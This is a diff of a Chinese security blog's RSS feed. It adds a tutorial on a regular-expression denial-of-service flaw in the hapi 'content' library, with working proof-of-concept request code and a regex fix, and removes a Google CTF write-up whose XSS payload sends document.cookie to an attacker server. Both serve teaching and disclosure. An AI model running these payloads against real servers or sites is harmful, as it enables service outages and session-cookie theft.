@@ -5,7 +5,97 @@
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/</link>
 <description>twosecurity.io</description>
 <language>zh-cn</language>
-<lastBuildDate>Wed, 04 Oct 2017 14:43:04 +0800</lastBuildDate>
+<lastBuildDate>Sat, 07 Oct 2017 22:00:15 +0800</lastBuildDate>
+<item>
+<title>基于正则表达式的 DDoS 及实例讲解</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-07-29920988.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;基于正则表达式的 DDoS 及实例讲解&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29920988&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在之前的&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28424183&quot;&gt;文章&lt;/a&gt;中，我们讲解过基于hash的 DoS 攻击。这篇文章中，我们将带来基于正则表达式类型的（Regular Expression）拒绝服务攻击的讲解。最后，我们用 hapi 框架的一个漏洞作为实例解析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是 ReDoS？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当一个正则表达式包含了冗余的匹配，那么它就极有可能引发 ReDoS（即:基于正则表达式的拒绝服务攻击）。由于过多的匹配，正则引擎的匹配速度会飞速下滑。就拿 &lt;b&gt;(a+)+ &lt;/b&gt;来说，当我们输入 &lt;b&gt;aa &lt;/b&gt;时，正则引擎会匹配成 &lt;b&gt;(a)(a)&lt;/b&gt; 或者&lt;b&gt; (aa)&lt;/b&gt;。如果我们输入了 &lt;b&gt;aaa&lt;/b&gt;，正则引擎就会查询&lt;b&gt;(aaa)&lt;/b&gt;，&lt;b&gt;(aa)(a)&lt;/b&gt;，&lt;b&gt;(a)(aa)&lt;/b&gt;，甚至是 &lt;b&gt;(a)(a)(a)&lt;/b&gt;。很明显，我们每多输入一个字母 &lt;b&gt;a&lt;/b&gt;，匹配的数量就要乘以2。不过有一点需要注意，我们最终传递进去的字符最终需要被匹配&lt;b&gt;&lt;i&gt;失败&lt;/i&gt;&lt;/b&gt; ，否则短路效应会直接结束匹配并返回结果，反之则会一直枚举可能的情况。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;寻找问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了基本知识，让我们来实际操作一下。一个正则表达式如下（最新版本已被修复）：&lt;/p&gt;&lt;code lang=&quot;python3&quot;&gt;/([^\=\*]+)(\*)?\s*\=\s*(?:([^;&#39;]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;看上去很棘手，不过只要问题的核心是冗余的表达式，我们就一定能发现漏洞。我们从头开始，第一个可疑处是 &lt;b&gt;\s*(?:([^;&#39;]+\&#39;[\w-]*\&#39;[^;\s]+)&lt;/b&gt;（排除多余的部分后，我们可以简化其为 &lt;b&gt;\s*[^;&#39;]+&lt;/b&gt;）。用自然语言来描述，大概意思就是找到跟随任意数量空格的非冒号或单引号的一个或多个字符。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在这个 &lt;a href=&quot;https://github.com/hapijs/content&quot;&gt;repo&lt;/a&gt; 中，我们可以得知这个表达式是 content 库用来解析 &lt;b&gt;Content-Dposistion &lt;/b&gt;头中的参数。一个合法的 &lt;b&gt;Content-Dposistion &lt;/b&gt;看上去像：&lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Disposition:form-data; name=&quot;content&quot;;filename=&quot;hello.txt&quot;&lt;/b&gt;。为了确认这一点，我们来用这个模块解析一下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
+const Content = require(&#39;content&#39;);
+const header = &#39;form-data; name=&quot;content&quot;; filename=&quot;hello.txt&quot;&#39;;
+console.time(&#39;parse&#39;);
+console.log(Content.disposition(header));
+console.timeEnd(&#39;parse&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如果你安装了 &lt;a href=&quot;mailto:%60content@3.0.5%60&quot;&gt;content@3.0.5&lt;/a&gt; 或之前的版本，你会得到这个：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{ name: &#39;content&#39;, filename: &#39;hello.txt&#39; }
+parse: 6.200ms
+&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们已知可以利用空格，并且构造的payload必须被匹配失败，那么应该如何写出PoC呢？答案很简单，先传入非空格字符，再在后面附加上尽可能多的空格。我们来做个500字的测试：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
+const
+Content = require(&#39;content&#39;);
+const
+header = &#39;form-data; x&#39; + new Array(500).join(&#39; &#39;);
+
+console.time(&#39;parse&#39;);
+console.log(Content.disposition(header));
+console.timeEnd(&#39;parse&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是输出：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{
+Error: Invalid content-disposition header format includes invalid parameters /*
+snip */ }
+parse:
+47.440ms&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;解析速度比原来慢了接近8倍，但总的来说还不算严重。当空格为1000时，解析则花了292ms，当我们再加多1000个空格后，解析器花了2387ms 执行。问题很明显了，不过我们依然不清楚它会有多严重的影响。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;利用content攻击hapi&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Disposition &lt;/b&gt;一般用来告诉客户端响应主体是内联的还是一个附件，有时也用来提供关于multipart form（多重表单）的元数据信息。由于第一个（用途）往往为服务器发出，我们就需要找出使用该框架解析 &lt;b&gt;Content-Disposition &lt;/b&gt;的客户端，而这十分罕见，所以我们不做讨论。不过第二种情况则屡见不鲜，让我们一起研究一下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于hapi使用content，我们就可以用它攻击hapi服务器。首先，我们得模拟接收表单（复现需要&lt;a href=&quot;mailto:hapi@16.5.2&quot;&gt;hapi@16.5.2&lt;/a&gt;及以下的版本）：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
+const
+Hapi = require(&#39;hapi&#39;);
+const
+server = new Hapi.Server();
+
+server.connection({
+port: 8080 });
+server.route({
+method: &#39;post&#39;,
+path: &#39;/&#39;,
+handler: function (request, reply) {
+return reply();
+}
+});
+
+server.start(()
+=&amp;gt; {
+console.log(&#39;started&#39;);
+});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在我们可以开始构造PoC了：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
+const
+Wreck = require(&#39;wreck&#39;);
+
+const
+payload = [
+&#39;--123456&#39;,
+&#39;content-disposition: form-data; x&#39; + new
+Array(2000).join(&#39; &#39;),
+&#39;content-type: text/plain&#39;,
+&#39;&#39;,
+&#39;text&#39;,
+&#39;--123456&#39;,
+&#39;content-disposition: form-data;
+name=&quot;field2&quot;&#39;,
+&#39;content-type: text/plain&#39;,
+&#39;&#39;,
+&#39;text&#39;,
+&#39;--123456--&#39;
+].join(&#39;\r\n&#39;);
+
+console.time(&#39;req&#39;);
+Wreck.post(&#39;http://localhost:8080&#39;,
+{ headers: { &#39;content-type&#39;: &#39;multipart/form-data; boundary=123456&#39;,
+&#39;content-length&#39;: Buffer.byteLength(payload) }, payload }, (err, res, body)
+=&amp;gt; {
+console.timeEnd(&#39;req&#39;);
+});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这一段代码跑了 46ms。似乎没有想象中这么慢，让我们看看哪里出来问题。翻了一段又一段的执行链，我们发现 hapi 使用 &lt;a href=&quot;https://github.com/hapijs/subtext&quot;&gt;subtext&lt;/a&gt; 中的 &lt;a href=&quot;https://github.com/hapijs/pez&quot;&gt;pez&lt;/a&gt; 解析payload。pez 会截断一个 header 的结束与另一个 header 的开头之间额外的空格，所以我们需要在空格结尾添加一个字符（用来表示该 header 还没结束）防止空格被移除：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;const payload = [
+&#39;--123456&#39;,
+&#39;content-disposition: form-data; x&#39; + new
+Array(2000).join(&#39; &#39;) + &#39;x&#39;,
+&#39;content-type: text/plain&#39;,
+&#39;&#39;,
+&#39;text&#39;,
+&#39;--123456&#39;,
+&#39;content-disposition: form-data;
+name=&quot;field2&quot;&#39;,
+&#39;content-type: text/plain&#39;,
+&#39;&#39;,
+&#39;text&#39;,
+&#39;--123456--&#39;
+].join(&#39;\r\n&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个 PoC 则执行了2000多ms，大功告成了！不过我们应该如何修复呢？&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;正确的解析方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前一个式子是因为空格的冗余匹配而导致的，因此，我们只需要在匹配字符时将空格也纳入黑名单即可：&lt;b&gt;\s*[^;&#39;\s]+&lt;/b&gt;，我们先来试试这种简单粗暴的改法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/([^\=\*]+)(\*)?\s*\=\s*(?:([^;&#39;\s]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;再运行一次 PoC，结果还是跑了两千多毫秒。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在该表达式开头处，你会看到 &lt;b&gt;[^\=\*]+\s*&lt;/b&gt;。因此，我们还需修正此处：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;&#39;\s]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在，执行一次 PoC 仅需六十多毫秒，终于大功告成了！&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-10-07-29920988</guid>
+<pubDate>Sat, 07 Oct 2017 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>利用 DuplicateHandle 绕过 Edge 代码执行保护</title>
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-03-29859057.htm</link>
@@ -764,37 +854,6 @@ Onload=&quot;changeBackground(&#39;red&#39;);&quot; //某个事件
 <author>Twosecurity</author>
 <guid isPermaLink="false">2017-08-23-28719766</guid>
 <pubDate>Wed, 23 Aug 2017 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>Google CTF - Joe</title>
-<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-08-22-28688437.htm</link>
-<description>&lt;meta charset=&quot;utf-8&quot;&gt;
-&lt;title&gt;Google CTF - Joe&lt;/title&gt;
-&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28688437&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;在 Joe 这道题中，我们会访问一个类似聊天室的页面，并通过文字和 AI Joe 对话。&lt;/p&gt;&lt;p&gt;Joe 有如下功能：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;打印自己的名字&lt;/li&gt;&lt;li&gt;设置新的名字&lt;/li&gt;&lt;li&gt;和你进行对话&lt;/li&gt;&lt;li&gt;向管理员汇报 bug&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-43a2643a0882553c72ee71bbcfb4e776_r.png&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1332&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;题目让我们偷管理员的 cookie。这样看来，汇报 bug 的功能就是用来给我们和管理员交互的。&lt;/p&gt;&lt;p&gt;乍一看，没发现什么漏洞。这里的消息是被当做 text 元素发送的，我一开始觉得此处不会引起 XSS。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;var row = document.createElement(&#39;p&#39;);
-row.className = peer;
-row.textContent = message;
-conversation.appendChild(row);
-&lt;/code&gt;&lt;h2&gt;&lt;b&gt;持久型 XSS&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我花了一点时间在这里注入 XSS，因为上述原因，XSS 一直不执行。不过刷新页面后， payload 竟然生效了：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d190f66a263c80d1771a8bf853e7a6a2_r.png&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1066&quot;&gt;&lt;p&gt;我们在自己的会话成功地 XSS，不过要怎么利用它？&lt;/p&gt;&lt;p&gt;我很快注意到了/message?msg=foo节点。网页会调用它来发送消息。我们注意一下/messaege节点 response 的最后一个 header:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;HTTP/1.1 200 OK
-Content-Type: text/html; charset=utf-8
-Cache-Control: no-cache
-Content-Encoding: gzip
-X-Cloud-Trace-Context: 805d41a72f2623ac1728fed38fcac495;o=1
-Vary: Accept-Encoding
-Date: Mon, 19 Jun 2017 10:45:42 GMT
-Server: Google Frontend
-Content-Length: 64
-Content-Type: `text/html`
-&lt;/code&gt;&lt;p&gt;不仅如此，节点也不会给自己编码。这意味着我们可以通过它 XSS 其他用户。&lt;/p&gt;&lt;p&gt;我一开始的想法是这样的：在 bug 汇报中提交这个节点，它的 msg 则设置为可以窃取 cookie的 payload。很可惜的是，这个页面有防 CSRF 机制。我并不能这么利用。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;加入我的 Seesion&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在登录聊天室时，我发现了这个请求：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3a924c7667fcc8a743fe55327036ef23_r.png&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1217&quot;&gt;&lt;p&gt;如你所见，网页传递了一长串 token 给/login。这是不是意味着我们能通过它发送会话固定攻击呢？&lt;/p&gt;&lt;p&gt;我把浏览器调到匿名模式，再用相同的 token 登录一遍，然后惊奇地发现原先会话留下的  PoC：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d327036238f2d0a730e327c12ce6082d_r.png&quot; data-rawwidth=&quot;1280&quot; data-rawheight=&quot;723&quot;&gt;&lt;p&gt;我们成功地让另一个用户执行了 JavaScript。同理，我们可以在汇报 bug 时附上带有该 token的 URL，然后利用 self-xss 盗取管理员的 cookie。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fef1b84b8c53a6aa753ce182eda72d3a_r.png&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1287&quot;&gt;&lt;p&gt;我让管理员访问如下页面：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;html&amp;gt;
-&amp;lt;body&amp;gt;
-&amp;lt;iframe src=&quot;https://joe.web.ctfcompetition.com/login?id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImEyOThhNTZiNmFjMDU0MzEyNTNkNDkwMzA4MTZhNWViZjk5YTEzYzUifQ.eyJhenAiOiIyODQ5NDAzNzA5MjUtY240aWZlZnVrMzNrbjBiODg3cHBwdjVmamI5MWU4cTcuYXBwcy5nb29nbGV1c2VyY29udGVudC5[...]&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;p&gt;并在自己的对话中插入：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;script&amp;gt;document.write(&#39;&amp;lt;img src=&quot;http://myserver.com?cookie?&#39; + document.cookie);&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;p&gt;这样，就可以成功地打到cookie了：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-56551f6824614c901f8501e1daece4e0_r.png&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;220&quot;&gt;&lt;p&gt;&lt;/p&gt;</description>
-<author>Twosecurity</author>
-<guid isPermaLink="false">2017-08-22-28688437</guid>
-<pubDate>Tue, 22 Aug 2017 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
